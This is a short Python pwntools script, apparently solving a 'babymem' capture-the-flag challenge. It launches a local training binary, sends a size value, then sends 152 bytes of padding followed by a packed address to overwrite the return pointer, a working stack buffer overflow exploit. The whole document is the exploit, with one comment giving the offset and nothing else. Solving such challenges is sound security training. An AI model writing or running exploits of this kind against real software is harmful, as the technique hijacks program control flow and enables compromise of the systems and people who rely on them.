from pwn import *;

proc = process('/challenge/babymem-level-3-0')
proc.recv()
proc.recvuntil(b'size: ')
proc.sendline(b'160')
# 152 offset to RET
proc.recv()
payload = b'A' * 152 + p64(0x401cdf)
proc.sendline(payload)
print(proc.recv())


